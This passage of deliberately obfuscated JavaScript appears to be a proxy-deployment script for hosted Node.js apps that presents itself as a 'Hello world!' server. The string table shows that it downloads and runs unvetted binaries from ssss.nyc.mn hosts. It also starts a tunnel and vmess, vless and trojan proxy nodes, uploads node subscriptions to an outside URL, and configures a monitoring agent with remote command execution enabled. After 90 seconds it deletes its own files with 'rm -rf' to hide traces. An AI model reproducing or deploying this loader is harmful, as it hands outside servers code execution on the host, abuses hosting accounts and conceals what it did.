_0x5705ca={_0x26640f:0x25f,_0x39f5d8:0x268,_0x2ac649:0x22c};setTimeout(()=>{const _0x5efd2f={_0x29f8ae:0x1f1},_0x223f19=_0x3a5e,_0x3bc476=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x3bc476[_0x223f19(_0x5705ca._0x26640f)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x3bc476[_0x223f19(0x25f)](phpPath);process[_0x223f19(0x226)]===_0x223f19(0x29a)?exec(_0x223f19(_0x5705ca._0x39f5d8)+_0x3bc476[_0x223f19(0x253)]('\x20')+_0x223f19(0x27b),_0xa7a3b6=>{const _0x313774=_0x223f19;console[_0x313774(0x22a)](),console[_0x313774(_0x5efd2f._0x29f8ae)](_0x313774(0x211)),console[_0x313774(_0x5efd2f._0x29f8ae)](_0x313774(0x1dd));}):exec(_0x223f19(0x203)+_0x3bc476['join']('\x20')+_0x223f19(_0x5705ca._0x2ac649),_0x26cd26=>{const _0xff4eae=_0x223f19;console['clear'](),console[_0xff4eae(0x1f1)](_0xff4eae(0x211)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x20577d={_0xdb1432:0x1f1,_0x388cfb:0x219,_0x4cc6f9:0x222,_0x1539c8:0x1f1,_0x2bc3b1:0x209,_0x18a4d7:0x21e,_0x30295a:0x28b},_0x356d14=_0x3568dd;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x356d14(_0x20577d._0xdb1432)](_0x356d14(_0x20577d._0x388cfb));return;}try{const _0x16cb90=await axios['post'](_0x356d14(_0x20577d._0x4cc6f9),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x356d14(_0x20577d._0x1539c8)](_0x356d14(_0x20577d._0x2bc3b1)),_0x16cb90;}catch(_0x48b3ea){return console[_0x356d14(_0x20577d._0x18a4d7)](_0x356d14(_0x20577d._0x30295a)+_0x48b3ea[_0x356d14(0x20a)]),null;}}function _0x4c29(){const _0x454d30=['rm\x20-rf\x20','/dev/null','abcdefghijklmnopqrstuvwxyz','quic','false','393354EuLdSd','automatic\x20access\x20task\x20added\x20successfully','message','tunnel.yml','2QbVobN','tcp','&path=%2Ftrojan-argo%3Fed%3D2560#','unshift','\x0aclient_secret:\x20','App\x20is\x20running','https://arm64.ssss.nyc.mn/v1','basename','readFileSync','UPLOAD_URL','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','10XLrryg','vless','Skipping\x20adding\x20automatic\x20access\x20task','send','ARGO_AUTH','14203bAmMrE','existsSync','error','881092TzmWXZ','Error\x20executing\x20command:\x20','.exe\x20>\x20nul\x202>&1','https://oooo.serv00.net/add-url','length','171mSiHUK','text/plain;\x20charset=utf-8','platform','\x20-c\x20','base64','Subscription\x20uploaded\x20successfully','clear','filter','\x20>/dev/null\x202>&1','boot.log','\x20-c\x20\x22','\x20successfully','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','http\x20server\x20is\x20running\x20on\x20port:','/vless-argo','writeFileSync','forEach','amd','--tls','aarch64','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','close','config.json','post','Nodes\x20uploaded\x20successfully','13810cgOdac','NEZHA_PORT','data','tunnel.json','UUID','catch','success','NEZHA\x20variable\x20is\x20empty,skip\x20running','createWriteStream','util','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','direct','finish','from','ARGO_PORT','PROJECT_URL','127.0.0.1','228GWwSrI','pkill\x20-f\x20\x22[','PORT','join','exec','Empowerment\x20failed\x20for\x20','CFIP','map','https://arm64.ssss.nyc.mn/web','https://ipapi.co/json/','1103552RBryzF','8443','toString','https://amd64.ssss.nyc.mn/agent','?security=tls&sni=','push','env','substring','AUTO_ACCESS','/api/delete-nodes','none','get','Content-Type','/trojan-argo','del\x20/f\x20/q\x20','readdirSync','mkdirSync','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','tls','freedom','/vmess-argo?ed=2560','php\x20running\x20error:\x20','https://amd64.ssss.nyc.mn/v1','country_code','./tmp','web\x20running\x20error:\x20','804CwGMuR','CFPORT','/vmess-argo','14289EJXcLa','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','includes','2096','\x20>\x20nul\x202>&1','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','TunnelSecret','https://arm64.ssss.nyc.mn/agent','cf92a638-615a-4c66-830e-6bee6026e54f','set','SERVER_PORT','https://arm64.ssss.nyc.mn/bot','443','test','npm\x20running\x20error:\x20','chmod','floor','isFile','/api/add-nodes','firefox','Add\x20automatic\x20access\x20task\x20faild:\x20','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','?encryption=none&security=tls&sni=','\x20>/dev/null\x202>&1\x20&','\x20is\x20created','has','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','2053','/sub.txt\x20saved\x20successfully','Unknown','2083','Hello\x20world!','status','fileUrl','pop','win32','sub','Error\x20reading\x20boot.log:','Download\x20','application/json','charAt','org','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','\x20is\x20running','list.txt','nohup\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','match','arm','random','ARGO_DOMAIN:','stringify','FILE_PATH','response','utf-8','unlinkSync','\x0a\x0avmess://','arm64','ARGO_DOMAIN','\x0avless://','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','child_process','http','taskkill\x20/f\x20/im\x20','sub.txt','NAME','log','\x20failed:\x20','Error\x20downloading\x20files:','split','blackhole','block','vmess','&fp=firefox&type=ws&host=','/config.json\x20>/dev/null\x202>&1\x20&','axios','\x0a\x20\x20tunnel:\x20','1311873YbBpSC','\x20already\x20exists','\x0a\x0atrojan://','countryCode','2087','NEZHA_SERVER','https+local://8.8.8.8/dns-query'];_0x4c29=function(){return _0x454d30;};return _0x4c29();}async function startserver(){const _0x12383d=_0x3568dd;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x5512c7){console[_0x12383d(0x21e)]('Error\x20in\x20startserver:',_0x5512c7);}}startserver()[_0x3568dd(0x244)](_0x6aa50b=>{const _0xd415a8={_0x5e5819:0x21e},_0xb23a13=_0x3568dd;console[_0xb23a13(_0xd415a8._0x5e5819)]('Unhandled\x20error\x20in\x20startserver:',_0x6aa50b);}),app['listen'](PORT,()=>console[_0x3568dd(0x1f1)](_0x3568dd(0x231)+PORT+'!'));
